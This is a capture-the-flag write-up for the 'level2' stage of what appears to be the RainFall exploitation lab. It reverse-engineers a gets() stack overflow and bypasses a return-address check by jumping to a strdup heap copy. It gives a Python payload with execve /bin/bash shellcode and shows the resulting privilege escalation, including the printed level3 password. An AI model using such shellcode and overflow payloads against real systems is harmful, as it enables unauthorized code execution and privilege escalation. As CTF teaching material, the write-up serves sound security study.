# Level2

## Information Gathering

We are once again given a binary to exploit. This binary also has minimal security options.

We reverse-engineer it using Ghidra, which gives us the following pseudo-C code:

```c
void p(void)
{
  uint unaff_retaddr;
  char local_50[76];
  
  fflush(stdout);
  gets(local_50);
  if ((unaff_retaddr & 0xb0000000) == 0xb0000000) {
    printf("(%p)\n", unaff_retaddr);
                    /* WARNING: Subroutine does not return */
    _exit(1);
  }
  puts(local_50);
  strdup(local_50);
  return;
}
```

And the stack frame looks like this:

```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined p()
             undefined         AL:1           <RETURN>
             undefined4        Stack[0x0]:4   local_res0                 
             undefined4        Stack[-0x10]:4 local_10                   
             undefined1        Stack[-0x50]:1 local_50                   
             undefined4        Stack[-0x68]:4 local_68                   
             undefined4        Stack[-0x6c]:4 local_6c                   
```

It looks like an easy buffer overflow, except `unaff_retaddr` is checked to see if it begins with `0xb`.

It's unclear what `unaff_retaddr` is because there’s no documentation on it. However, if we look at the assembly corresponding to these lines and the stack frame:

```assembly
        080484f2 8b 45 04        MOV        EAX,dword ptr [EBP + local_res0]
        080484f5 89 45 f4        MOV        dword ptr [EBP + local_10],EAX
        080484f8 8b 45 f4        MOV        EAX,dword ptr [EBP + local_10]
        080484fb 25 00 00        AND        EAX,0xb0000000
                 00 b0
        08048500 3d 00 00        CMP        EAX,0xb0000000
                 00 b0
```

We can see that this is just the return address.

This effectively prevents us from overwriting the return address with an address on the stack because stack addresses in this program seem to always start with `0xb`.  
But look at the end! There's a call to `strdup`, which seems useless to the program but very useful to us. If we can determine the address that `strdup` returns,  
we can overwrite the return address with that value so that it lands on a copy of our shellcode.

```text
$> ltrace ./level2
level2@RainFall:~$ ltrace ./level2
__libc_start_main(0x804853f, 1, 0xbffff7f4, 0x8048550, 0x80485c0 <unfinished ...>
fflush(0xb7fd1a20)                                                                                                                = 0
gets(0xbffff6fc, 0, 0, 0xb7e5ec73, 0x80482b5dfjgpodsgsdg
)                                                                                     = 0xbffff6fc
puts("dfjgpodsgsdg"dfjgpodsgsdg
)                                                                                                              = 13
strdup("dfjgpodsgsdg")                                                                                                            = 0x0804a008
+++ exited (status 8) +++
```

I have no clue at this point if the address will always be `0x0804a008` on every execution, but maybe we should try—because I’m too lazy to be smart.  

---

## Exploitation

If we look back at the stack frame, our buffer starts at  
`%rsp - 0x50`, and the return address is the 4 bytes right after that.

So, all we need to do is write our shellcode within the first `0x50` bytes and then write `0x0804a008` in little-endian format (we can confirm that using the `file` command on our executable).

```py
import struct

heap_addr = 0x0804a008
shellcode = b"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"
payload = shellcode
payload += b"\x90" * (0x50 - len(shellcode))
payload += struct.pack("<I", heap_addr)

with open("payload", "wb") as f:
    f.write(payload)
```

And nice, we have our malicious input as a file. Now, we just need to redirect it into the stdin of `level2`:

```text
level2@RainFall:~$ ./level2 < /tmp/payload
j
 X�Rfh-p��Rjhh/bash/bin��RQS��̀������������������������������������������
level2@RainFall:~$ id
uid=2021(level2) gid=2021(level2) groups=2021(level2),100(users)
```

WTF, nothing happened?!  

That’s because when the program receives all the input from `/tmp/payload`, it just closes stdin. So `bash` goes,  
*"What, no stdin? I have no purpose! Au revoir."*  

To fix this, we can use a pipe and an unending `cat` command to keep it open:

```text
level2@RainFall:~$ (cat /tmp/payload; cat) | ./level2
j
 X�Rfh-p��Rjhh/bash/bin��RQS��̀������������������������������������������
id
uid=2021(level2) gid=2021(level2) euid=2022(level3) egid=100(users) groups=2022(level3),100(users),2021(level2)
```

And **wouhou**, we have `level3`'s effective UID and GID, meaning we can read their files. So, we simply `cat` the `.pass` file in their home folder:

```text
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

**Easy. On to the next one.**

---

## References

- [Execve /bin/sh -0 -0 in a Pipe](https://stackoverflow.com/questions/8509045/execve-bin-sh-0-0-in-a-pipe)

